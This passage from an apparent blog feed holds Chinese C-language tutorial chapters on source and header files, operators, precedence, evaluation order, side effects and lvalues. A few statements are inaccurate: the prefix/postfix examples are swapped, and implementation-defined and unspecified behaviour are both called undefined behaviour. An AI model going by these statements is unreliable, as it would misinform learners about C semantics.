/><p>其他还有很多,大部分是新标准引入的,我们暂时也用不到,这里就不放图了.</p><h3 id="保留的标识符">保留的标识符</h3><p>我们直接看标准的描述,这里放一张最基本的要求,实际上我们先记住,自定义的标识符不能和关键字重名.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001004113590.png" alt="image-20231001004113590"></p><p>​—WAHAHA 2023.9.30</p><h1 id="c语言的相关文件类型">C语言的相关文件类型</h1><h2 id="源文件">源文件</h2><p>源文件即C的源代码文件,以后缀<code>.c</code>结尾,我们编写的一般代码,包括函数定义等,都放在源文件中:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231107024355840.png" alt="image-20231107024355840" style="zoom:50%;" /><h2 id="头文件">头文件</h2><p>我们在编写程序时,往往要使用到很多的外部库,用以支持更多的功能,例如C语言默认的标准库,或者是我们自己编写的库,再或者是第三方开发者写好的库.</p><p>这些库中包含有许多的已经写好的函数等内容,我们往往找不到他们的源文件,因为他们一般是编译好的动态库文件,没有源代码,这时候,我们需要使用头文件来引入库中的各种声明,例如<code>一些函数的声明,常量的声明,宏的定义</code>,他们往往都在头文件当中.我们只需要使用<code>#include</code>指令来在我们的源文件中引用该头文件,就可以使用对应的函数了:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231107024955234.png" alt="image-20231107024955234" style="zoom:50%;" /><h2 id="其他中间文件">其他中间文件</h2><p>编译器在编译过程中会生成一些中间文件,例如.s汇编文件,.o目标文件等等,我们暂时无需理会.</p><p>另外,不同的软件有着各自管理C语言工程的方式,他们往往会在项目文件夹下生成各种各样的文件,他们并不是C标准使用的文件,而是软件特定生成的文件,用于管理项目.例如VS会生成<code>.sln文件</code>,VC++6.0会生成<code>.opt文件</code>等等.</p><p>目前,我们仅仅需要关心.c源文件和.h头文件这两种文件即可.</p><p align=right>---WAHAHA 2023.11.07</p><br><br><p>上一篇:<a href="../2023d1f77d78f8b6/">c语言教程-1_1-什么是程序</a></p><p>下一篇:<a href="../2023bb3b8099b657/">c语言教程-2-环境搭建</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-9-运算符及其优先级和求值顺序</title>
      <link href="/2023a60ec9bcedd8/"/>
      <url>/2023a60ec9bcedd8/</url>
      
        <content type="html"><![CDATA[<p>注意,本章讲解的<code>优先级</code>,<code>求值顺序</code>,<code>副作用</code>极其重要,甚至一些十分熟悉C语言的老手也可能会犯相关的错误!</p><h1 id="运算符">运算符</h1><h2 id="什么是运算符">什么是运算符</h2><p>我们在前面讲解过<code>表达式</code>,<code>语句</code>的概念,也讲解并使用了一些基本的<code>运算符</code>,例如四则运算,赋值运算符等.</p><p>这一部分我们将会详细扩充一些运算符,并仔细讲解运算符与表达式求值的一些重要细节.</p><p>运算符和表达式不可分割,我们再来看一下标准中对<code>表达式</code>的描述:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162451089.png" alt=""></p><p>再看一下Microsoft文档中关于操作数的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930224827531.png" alt="image-20230930224827531" style="zoom:40%;" /><p>也就是说,<code>运算符</code>及其<code>操作数</code>的序列组成一个表达式.单一的运算符无法发挥作用,必须至少有一个对应的操作数才能构成一个表达式.至于<code>操作数</code>的概念很好理解,简单来说就是参与运算的各种值.</p><p>下面来详细细分一下C语言中的各种常用运算符.</p><h1 id="赋值运算符">赋值运算符</h1><h2 id="运算符">=运算符</h2><p><code>=运算符</code>是最简单的赋值运算符,它用于将=右边表达式的值赋值给左边的变量.</p><p>C语言中,一个单独的<code>=</code>并不意味着&quot;等于&quot;,这和<code>Visual Baisc</code>等语言并不相同,他是一个赋值运算符.例如:</p><p><code>a = 3;</code></p><p>用于将=右边的值<code>3</code>赋给左边的变量<code>a</code>.也就是说,=左边是一个变量,右侧是将要赋给该变量的值.</p><p>赋值行为是从右向左的.</p><p>进一步注意,我们需要区分数学表达式和C表达式的区别,假如我们有:</p><p><code>i=i+1;</code></p><p>显然这个合法的语句在数学上行不通,但是,C语言中,这代表着把变量i的值加上1,然后将新值重新赋值给i变量.</p><p>这条语句中,左边的i指示一个变量,我们将要向i中写入数据;右边的i代表当前i中存储的值,我们取出该值并用于运算.</p><p>另一方面,类似这样的语句是错误的:</p><p><code>3 = a;</code></p><p>因为3是一个常量,你不能对其进行修改—无论是从语法上还是从逻辑上都不正确.很显然,3就是3,我们当然不能把3&quot;赋值&quot;为4.实际上,我们判断这样的语句是否合法,看的是<code>=</code>左边是否为一个<code>左值</code>,更准确的说,是<code>可修改的左值</code>.这个问题请见本章下面的部分.</p><h2 id="复合赋值元素符">复合赋值元素符</h2><p>不仅仅有<code>=运算符</code>这个最基本的赋值运算符,为了简化代码,C语言还有其他的几种赋值运算符,我们将其称为<code>复合赋值运算符</code>.我们直接来看<code>标准</code>中的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004230937705.png" alt="image-20231004230937705" style="zoom:50%;" /><p>就是这些,写代码时如果有类似的赋值,直接使用复合赋值运算符即可.</p><h1 id="算术运算符">算术运算符</h1><h2 id="加法运算符">加法运算符: +</h2><p>+的使用非常显而易见,但是我们需要注意的是,+的左右两个操作数无论是否为右值,最后加法运算的结果(也就是这个表达式的值)一定是一个右值.</p><p>例如:</p><p><code>a+b</code>中,a和b都是左值,但是a+b计算出来的值,也就是表达式a+b是一个右值.</p><h2 id="减法运算符">减法运算符: -</h2><p>同理,它用于减法运算,和+一样,需要两个操作数.</p><p>+和-都需要两个操作数,所以他们都是<code>二元运算符</code>.</p><h2 id="符号运算符-和">符号运算符: +和-</h2><p>这里和加法,减法运算符使用相同的符号,但是一定注意,他们是不同的!</p><p>因为我们可以有这样的一个表达式:</p><p><code>+a</code></p><p>或者</p><p><code>-a</code></p><p>这意味这此处的+或-仅仅需要一个操作数,所以他们都是<code>一元运算符</code>,其作用也很简单—取相反数.</p><p>不过在过去,<code>+a</code>是不被允许的.</p><h2 id="乘法和除法运算符-和">乘法和除法运算符: *和/</h2><p>关于这两个表达式之前就说过了,他们也是<code>二元运算符</code>.需要注意的是,别忘了除法运算符有<code>截断</code>这个特性(整数除法结果的小数部分被丢弃).</p><h2 id="求模运算符">求模运算符: %</h2><p>%运算符用于求<code>a除以b的余数</code>,该运算符要求左右两个操作数<code>必须</code>均为整数.</p><p>关于正数,没有任何问题.</p><p>对于负数而言,例如<code>-8%3</code>,其结果要多注意一下.</p><p>我们有公式:<code>A % B = A - A / B * B</code></p><p>或者可以简单记忆规律:</p><p><strong>取模运算结果的正负是由左操作数的正负决定的.如果%左操作数是正数,那么取模运算的结果是非负数;如果%左操作数是负数，那么取模运算的结果是负数或0</strong></p><h2 id="位运算符">位运算符 &amp;,|,^,&lt;&lt;,&gt;&gt;</h2><p>注:学习这节之前,最好尽量了解原码,补码和反码.</p><p>位运算符用于按位逻辑对操作数进行运算.</p><p>位运算的位,指的是二进制位,也就是说,位运算直接以二进制来处理操作数.</p><h3 id="按位与">按位与: &amp;</h3><p>二者皆为1,结果才为1,否则为0</p><p>例如 <code>3 &amp; 1</code>的结果为<code>1</code></p><p>即二进制011和001按位<code>与</code>运算,结果为001,也就是十进制1</p><h3 id="按位或">按位或: |</h3><p>二者皆为0,结果才为0,否则为1</p><p>例如 <code>3 | 2</code>的结果为<code>3</code></p><p>即二进制011和010按位<code>或</code>运算,结果为011,也就是十进制3</p><h3 id="按位异或">按位异或: ^</h3><p>二者相同为0,不同为1</p><p>例如 <code>4 ^ 2</code>的结果为<code>6</code></p><p>即二进制100和010按位<code>异或</code>运算,结果为110,也就是十进制<code>6</code></p><h3 id="左移运算符">左移运算符: &lt;&lt;</h3><p>该运算符将操作数(以二进制处理)每一位向左移动(即向高位移动)k位,右边空出来的k位(即低位)用0填充,高位溢出的k位丢弃</p><p>例如 <code>3 &lt;&lt; 2</code>的结果为<code>12</code></p><p>这里以一个字节的移位来举例</p><p>即3的二进制00000011向左移动2位,结果为00001100,其中最左边的2个0丢弃,最右边填充2个0,也就是十进制<code>12</code></p><p>实际上,由于是对二进制移位,对m左移k位相当于m乘以2^k.例如3&lt;&lt;2的结果就是3*2^2,也就是12</p><p>如果不能理解,尝试假设十进制移位,将m进行十进制左移k位相当于乘以10^k,例如3&lt;&lt;(base10)2的结果就是3*10^2,也就是300</p><p>关于负数,左移会影响其符号位.</p><h3 id="右移运算符">右移运算符: &gt;&gt;</h3><p>这里要注意,尽量对正数进行右移,而不要对负数进行右移.</p><p>原因是:由于整数在计算机中以补码存储,最高位为符号位,那么就会有两种不同的右移—<code>算数右移</code>和<code>逻辑右移</code>.</p><h4 id="算数右移">算数右移:</h4><p>右移k位时,高位空出来的k位以原操作数的符号位填充,以保持结果的符号不变.</p><h4 id="逻辑右移">逻辑右移:</h4><p>右移k位时,高位空出来的k位以0填充.</p><h4 id="c语言的实现">C语言的实现</h4><p>C语言中,右移取决于具体实现,尽管<code>大部分实现(编译器)为算数右移</code>,但是不能保证所有的机器/编译器都是这样.</p><p>也就是说,C语言中,对于有符号数的右移操作,这是一个<code>未定义行为</code>.我们尽量避免对有符号数(负数)进行右移操作.</p><h4 id="移位运算符的问题">移位运算符的问题</h4><p>关于左移和右移的另一个问题是,如果我们指定移动的位数为负数(例如<code>&lt;&lt; -3</code>),或者大于等于左操作数原本的二进制位数(例如,int为32位,但是我们<code>&lt;&lt; 33</code>)</p><p>那么<code>该行为未定义</code>,具体请查阅文档.例如,某些实现中,对int值进行<code>&lt;&lt; -3</code>被处理为<code>&lt;&lt; 32 + (-3)</code>也就是<code>&lt;&lt; 29</code></p><h1 id="自增自减运算符">自增自减运算符</h1><p>这两个运算符本来是用于简化形如<code>a=a+1</code>和<code>a=a-1</code>这样的表达式的,但是实际上,有些其他语言的开发者甚至认为C语言的这两个运算符的特性带来的弊大于利.</p><h2 id="和-运算符">++和–运算符</h2><p>正如上面所写,用于简化形如<code>a=a+1</code>和<code>a=a-1</code>这样的表达式.</p><p><code>a=a+1</code>就等价于单独的<code>++a</code>或者<code>a++</code></p><p><code>a=a-1</code>就等价于单独的<code>--a</code>或者<code>a--</code></p><p>++和–有一个操作数,并允许该操作数放在左边(前缀自增/自减,例如a++)或放在右边(后缀自增/自减,例如–a)</p><h2 id="前缀和后缀的重要区别与副作用">前缀和后缀的重要区别与副作用</h2><p>前缀和后缀两种写法在单独使用时没有任何区别(一般编译器都会进行优化).</p><p>但是如果将其放在表达式中,就会出现区别.考虑下面两个语句:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">3</span>,b=<span class="number">3</span>,c,d;</span><br><span class="line"><span class="comment">// 第一条语句</span></span><br><span class="line">c = ++a;</span><br><span class="line"><span class="comment">// 第二条语句</span></span><br><span class="line">d = b++;</span><br></pre></td></tr></table></figure><p>读者认为执行完后a,b,c,d的值各自是什么?</p><p>答案是: a为4,b为4,c为4,d为3</p><p>是否出乎你的预料?</p><p>实际上是这样的,从结果上来看:</p><p>1.前缀<code>++a</code>返回的结果为a自增后的值,也就是4,将其赋值给c,a最终为4</p><p>2.后缀<code>b++</code>返回的结果为b自增前的值,也就是3,将其赋值给d,b最终也为4</p><p>也就是说,前缀和后缀都会将操作数自增,但是这个表达式作为一个整体,返回的值是不一样的.</p><p>总结来说:</p><p>如果有如下表达式:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">++表达式<span class="number">1</span></span><br><span class="line">表达式<span class="number">2</span>++</span><br></pre></td></tr></table></figure><p>第一个式子:前缀自增运算符的结果是将值<code>1</code>加到<code>表达式1</code>的值.</p><p>第二个式子:后缀自增运算符的结果是原来表达式的值,也就是<code>表达式2</code>的值.</p><br><p>尽管++和–的主要目的是将操作数的值加1或减1,但是我个人仍然愿意将其归为这个运算符的<code>副作用</code>,毕竟,其要组成表达式,表达式的值<code>通常</code>是重点关注的对象.但是,巧就巧在这里我们既要关心自增,又要使用其返回的值.</p><p>那么,我个人倾向于将++a或–a等视作&quot;有副作用的表达式&quot;,也就是说,<code>现在我更关心这个表达式最终的值</code>,而这几个表达式的主要作用—将a自增或自减1—我认为是<code>副作用</code>,因为对这个表达式进行求值是不可逆的(当然可以再减回去或加回去,你知道我不是这个意思),<code>它们让a的值发生了变化</code>!</p><p>这里再次出现了<code>副作用</code>的概念,虽然大部分资料均为有这个名词的描述,可能甚至根本不关心,但是由于初学者的许多代码(无论是他们自己写的,或者是某些烂书/烂资料/烂题中出现的)常常会纠结表达式的<code>副作用</code>及引出的相关一些<code>未定义行为</code>,从而导致理解和使用的错误,本教程要对这个问题进行详细讨论!</p><h1 id="逻辑运算符">逻辑运算符</h1><p>与&amp;&amp;,或||,非!</p><p>注意位运算的&amp;和|是单独的一个&amp;和|,与逻辑运算符没有任何关系</p><p>在讲解循环的时候,已经讲解了逻辑运算符,已经基本包含所有问题,同时讲解了<code>短路效应</code>,短路效应可能引发的问题会在后面<code>副作用</code>的讲解中描述.</p><h1 id="比较-关系-运算符">比较(关系)运算符</h1><p>==,&lt;=,&gt;=,&lt;,&gt;,!=</p><p>同样在前面已经讲解.</p><p>需要注意的是,比较运算符常常和逻辑运算符搭配,例如:</p><p><code>if(a &gt;= 0 &amp;&amp; a &lt;= 100)</code></p><p>这里仍需要注意<code>优先级</code>的问题,逻辑运算符的优先级整体低于比较运算符(除了<code>非!</code>),所以,先判断a的两个范围,即<code>是否大于等于0</code>和<code>是否小于等于100</code>,最后取并集,也就是是否在0~100内.</p><p>实际上也就是<code>if( ( a &gt;= 0 ) &amp;&amp; ( a &lt;= 100 ) )</code></p><p>一般情况下,<code>()</code>的优先级全场最高,我们可以使用<code>()</code>来改变优先级.</p><h1 id="成员访问运算符">成员访问运算符</h1><p>包括有:</p><p>下标运算符<code>[]</code>,指针解引用运算符<code>*</code>,取地址运算符<code>&amp;</code>,成员访问运算符<code>.</code>,指向结构体成员运算符<code>-&gt;</code></p><p>这些运算符的讲解融入到后面的各章节中.</p><h1 id="其他运算符">其他运算符</h1><p>这里仅说明几个常用的运算符.</p><h2 id="三目条件运算符">三目条件运算符</h2><p>唯一的三目运算符,形式为:</p><p><code>条件表达式 ? 表达式1 : 表达式2</code></p><p>当<code>条件表达式</code>为真,则对表达式1求值;</p><p>当<code>条件表达式</code>为假,则对<code>表达式2</code>求值.</p><p>例如求2个数中的较大值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 使用三目运算符来比较两个数的大小</span></span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>, c;</span><br><span class="line">    c = (a &gt; b) ? a : b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = %d\n&quot;</span>, c); <span class="comment">// c = 20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sizeof运算符">sizeof运算符</h2><p>是的,这是一个运算符,可能许多朋友认为他是一个函数,但是他确确实实是一个运算符.</p><p>sizeof运算符用于求运算对象的大小,结果以字节为单位.</p><p>运算对象可以是<code>类型</code>或<code>表达式</code>.</p><p>例如:</p><p><code>sizeof(int)</code>在32位机器下的结果为<code>4</code>—大多数情况下int占用4字节</p><p><code>sizeof(char)</code>的结果为<code>1</code>—char类型占用1字节</p><p>若有<code>char a=2;</code>那么<code>sizeof(a)</code>的结果为1—char类型的变量占用1字节</p><p>之所以说sizeof不是函数,是因为我们可以这样写:</p><p>若有<code>char a=2;</code>那么可以写<code>sizeof a</code>,省略了<code>小括号()</code></p><p>但是需要注意,sizeof作用于类型的时候,必须加上<code>小括号()</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004235532383.png" alt="image-20231004235532383" style="zoom:50%;" /><p>上图可以看出编译器报错了.</p><p>注意,sizeof运算符返回的结果并不是<code>int</code>,而是<code>size_t</code>:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004235749893.png" alt="image-20231004235749893" style="zoom:50%;" />我们只要记住他是一个无符号的整数即可,而且通常printf时最好使用<code>%llu</code>来输出:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004235906154.png" alt="image-20231004235906154" style="zoom:50%;" /><p>上图为CLion的截图,CLion对这里的%d做出了警告,当然,因为sizeof(int)和sizeof(char)的值太小了,实际上用%d也无妨,但是,最好还是规范代码.</p><h2 id="逗号运算符">逗号运算符: ,</h2><p>逗号运算符<code>,</code>用于将多个表达式连接起来,构成一个更大的表达式—可以叫它<code>逗号表达式</code>.</p><p>需要注意的两点是,<code>逗号运算符是全局优先级最低的运算符,并且其结合律为从左向右</code>.</p><p>另外重要的一点是,<code>最后一个子表达式的值作为整个逗号表达式的值来返回</code>.</p><h4 id="使用示例1">使用示例1:</h4><p>我们可以利用逗号运算符将不相关的,功能相似的几步操作放在一起.例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    a = b = c = <span class="number">4</span>; <span class="comment">// 由于各个赋值运算符的优先级相同,且结合律为从右向左,所以先执行c=4,然后b=c=4,最后a=b=4</span></span><br><span class="line">    a++, b++, c++; <span class="comment">//   逗号表达式的优先级最低,且结合律为从左向右,所以先执行a++,然后b++,最后c++</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, a, b, c); <span class="comment">// 5 5 5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码举了一个最简单的例子,我们想要把a,c,c的值都自增1,并且互不影响,就可以这么写在用一条语句中,使用逗号运算符进行连接.</p><h4 id="使用示例2">使用示例2:</h4><p>必须指出的是,一定要注意<code>互不影响</code>这个问题,如果各个表达式的求值之间有影响,那么就需要慎重考虑,甚至运行结果可能不是我们想要的.例如举一个没有什么实际意义的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">4</span>;</span><br><span class="line">    a = b + <span class="number">1</span>, <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a); <span class="comment">// 输出结果为5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尽管这段代码没有什么实际意义,但是足以说明问题.</p><p>前面已说明,逗号运算符的优先级全场最低,所以第5行的语句中有两个被逗号运算符连接起来的表达式:</p><p><code>a = b + 1</code>和<code>printf(&quot;%d&quot;,a)</code></p><p>第二个表达式调用了printf()函数,它叫做<code>函数调用表达式</code>,这里的<code>小括号()</code>前面加上一个函数标识符(中间可能有参数)代表一个<code>函数调用</code>.</p><p>前面同样已说明,逗号运算符的结合性是从左向右,那么我们应该先计算<code>a = b + 1</code>,让a的值变为<code>5</code>,然后在调用printf()函数将a的值输出,所以最终的输出结果是<code>5</code>.</p><p>这里同样可以认为对a赋值实际上产生了一个副作用,然后这个副作用影响到了后面的表达式的继续求值—对printf的调用仍然认为是对表达式求值,只是这里的表达式是一个<code>函数调用表达式</code>.导致输出的a不再是原来的<code>3</code>.</p><h4 id="使用示例3">使用示例3:</h4><p>如果你还是对这里的副作用的影响没有什么重视的话,下面的代码可能让你重新思考:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, b;</span><br><span class="line">    b = (++a, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, b); <span class="comment">// 输出结果为4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我知道很多人可能会骂我,说我用一个很不好的(甚至是极差的)代码作为例子来讲解,但是,为了说明轻视副作用可能导致的危害,我还是要以一些不良的代码作为反面教材.</p><p>我们前面的示例1和示例2都在主要关注由逗号运算符连接起来的两个子表达式,在示例3中,我们的代码的关注点是<code>逗号表达式</code>整体的值!</p><p>显然,(++a,a)的两个子表达式之间的副作用有互相影响—即++a执行后,对a的求值结果将会是一个自增后的新值.</p><p>前面已经说明:<code>最后一个子表达式的值作为整个逗号表达式的值来返回</code>.那么,<code>++a,a</code>这个表达式的最终的值就是最后一个表达式<code>a</code>的值,由于<code>++a</code>使a变为4,则表达式<code>a</code>的值为<code>4</code>,进而最终赋值给b的值为<code>4</code>.</p><p>所以,最后输出的结果为<code>4</code>.</p><p>这个示例示范了如何求整个逗号表达式的值,并进一步的说明了副作用的问题.如果<code>++a</code>不是我们的本意,那么就很可能存在一个难以察觉的bug.</p><p><code>我们要万分小心,仅仅是初学到现在,我们就已经遇到了好几种运算符的副作用可能引发的潜在问题!---即使你自己完全没有意识到!</code></p><h4 id="进一步拓展-低级错误引发的bug">进一步拓展-低级错误引发的bug</h4><p>注:上面的讲解可能有点牵强,实际上,更常见的出乎我们本意的代码是这样:</p><p>将 <code>a == 3</code>错误地写成 <code>a = 3</code>,原来的表达式用于检验a的值是否为3—根据实际情况返回1或者0.</p><p>但是 <code>a = 3</code>却是直接将a的值覆盖为3,然后这个表达式返回<code>=</code>右边的值,也就是3,C语言中,3为非0值,意味着这个表达式的永远为真!这才算得上是一个非常容易犯的低级错误—导致了一个可能很难察觉的bug—也许大多数情况下他本来就是<code>真</code>,所以短时间很难发觉这个bug!</p><p>所以,很多人愿意将上面的表达式这样写: <code>3 == a</code>,因为 <code>3 = a</code>的写法根本无法通过编译!</p><h1 id="重点-运算符优先级和求值顺序">重点:运算符优先级和求值顺序</h1><p>我们现在仅讲解了基本运算符,我们拿这些简单的运算符进行举例.</p><h2 id="优先级">优先级</h2><p>优先级和数学上运算符优先级的意义是类似的,与数学相似,无论是加减乘除,还是赋值等运算符都有不同的优先级,如果一个表达式有多个运算符,我们首先根据优先级来确定表达式的运算顺序.</p><p>考虑下面的代码:</p><p><code>sum = 12.0 + 40.0 * n / part;</code></p><p>假设n的值为2,part的值为4.</p><p>这条语句中的赋值运算符右面有加法,乘法和除法运算符,先算哪一个?这里无需废话,和数学一样,先算乘除法,再算加减法,但是这是我们一眼看出来的,如果是C编译器来处理这段代码,则必须有提前规定好的运算顺序,也就是<code>先算乘除法,再算加减法</code>.</p><p>C语言中对此问题有着明确的规定,为每一个运算符都规定了各自的<code>优先级</code>,优先级高的运算符(乘除法)先执行运算,然后返回的结果再继续和优先级低的运算符(加减法)结合执行运算,这样,上面的代码如何运算就非常明确.</p><p>如果两个运算符的优先级相同怎么办?如果他们处理同一个运算符对象,则根据他们在语句中出现的顺序而言,<code>大多数运算符都是从左向右依次运算(=运算符除外)</code>.</p><p>如此,上面的语句是如此执行:</p><p>40.0 * n        首先计算*或/,发现他们处理同一个操作数n,则根据从左向右结合的顺序,先计算*,结果是80.0</p><p>80.0 / part     然后计算/,结果为40.0</p><p>12.0 + 40.0     最终结果为52.0</p><p>到目前为止,我们学习过的运算符的优先级:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004211804464.png" alt="image-20231004211804464" style="zoom:45%;" /><p>注意对于C语言而言,符号运算符和加减法运算符是不同的,首先他们的操作数的数量就不同.</p><h2 id="求值顺序">求值顺序</h2><p>为了解决运算顺序,C语言明确规定了运算符的优先级,但是这并没有规定所有的顺序,来看下面的代码:</p><p><code>y = 6 * 12 + 5 * 20;</code></p><p>当运算符共享一个运算对象时,优先级确定了求值顺序,再进一步,如果优先级相同(例如乘除),那么结合性进一步确定求值顺序.</p><p>但是,上面这个语句中,有两个乘法运算.显然这两个乘法比加法先进行运算,但是问题来了:这两个乘法先算哪个.</p><p>实际上,C语言<code>并未规定</code>这两个乘法先计算哪一个,这取决于具体实现—意味着不同的电脑(计算机),甚至是一台电脑上不同的编译器运行出来的结果也不相同—有可能先算前者的实现在A硬件上效率更高,在B硬件上反而更适合先算后者.这种未明确规定的行为叫做<code>未定义行为</code>,这里就是一个关于<code>求值顺序</code>的未定义行为,他们十分重要!</p><p>许多朋友可能认为这并不是一个问题,事实上非常重要,<strong>不清晰的代码甚至可能引发严重的问题</strong>(我们会在后面介绍到其他运算符后并重新讲解<code>副作用</code>时进行举例).</p><p>不过,就上面的这样代码而言,先算后算并没有影响,因为4个操作数都是常数,也就不存在副作用的影响,最终的结果显然不变.</p><h1 id="数据对象-左值-右值">数据对象,左值,右值</h1><p>这里简要说明一些概念,具体详细的描述另见<code>标准文档</code></p><h2 id="数据对象">数据对象</h2><p>赋值表达式的实际效果是将某个值存储到某个指定的位置上,这一段指定的数据存储空间称之为<code>数据对象</code>,也许有些朋友了解过面向对象和面向过程的区别,请不要混淆,这里的&quot;对象&quot;指的是操作的焦点.C标准只有在这时才会使用<code>对象</code>这个术语.</p><h2 id="左值">左值</h2><p>C语言中,所谓<code>左值</code>就是除类型void之外的任何对象类型,且隐含地指代一个对象的表达式.对左值表达式求值得到对象标识.</p><p>左值可用于如下<code>左值语境</code>:</p><ul><li>作为取值运算符的操作数(除了指代位域和register的左值)</li><li>作为前/后自增/减运算符的操作数</li><li>作为成员访问运算符(.)的左操作数</li><li>作为赋值及复合赋值运算符的左操作数</li></ul><p>满足下面之一的表达式是左值:</p><ul><li>标识符,含具名函数形参,只要声明为指代对象(而非函数或枚举常量)</li><li>字符串字面量</li><li>复合字面量(C99)</li><li>括号表达式,若去掉括号后为左值(也就是加了括号的左值)</li><li>成员访问运算符(.)的结果,若其左参数是左值(也就是结构体成员)</li><li>指针访问运算符(-&gt;)的结果(也就是结构体指针指向的结构体的成员)</li><li>对指向对象指针运用解引用(*)运算符的结果(即指针指向的对象)</li><li>下标运算符([])的结果(即数组元素)</li></ul><h2 id="可修改左值">可修改左值</h2><p>一个<code>可修改左值</code>是任何完整的非数组类型的,非const限定的左值表达式(结构体/联合体则没有任何成员为const限定)</p><h2 id="右值">右值</h2><p>C语言的<code>右值</code>即为<code>非左值对象表达式</code>,它不指代对象,而是指代一个值,不能对右值取址.</p><p>整数,字符,浮点数常量以及所有不返回左值的运算符构成的表达式为<code>非左值对象表达式</code>.</p><br><p>本章进行了运算符,优先级,求值顺序的讲解.同时在关键的前缀/后缀++或–的讲解中描述了什么是<code>副作用</code>,由于在许多方面都会有体现,并且碍于目前讲到的知识不足,这里不方便展开讲解,所以在后面的各个知识点的讲解中会穿插进行讲解.</p><p align=right>---WAHAHA 2023.10.4</p><br><br><p>上一篇:<a href="../20230671b7d09817">C语言教程-8-跳转控制和嵌套</a></p><p>下一篇:<a href="../2023b7fda0df05ff">C语言教程-10-数组</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序结构分析</title>
      <link href="/2023d0939b85fcd0/"/>
      <url>/2023d0939b85fcd0/</url>
      
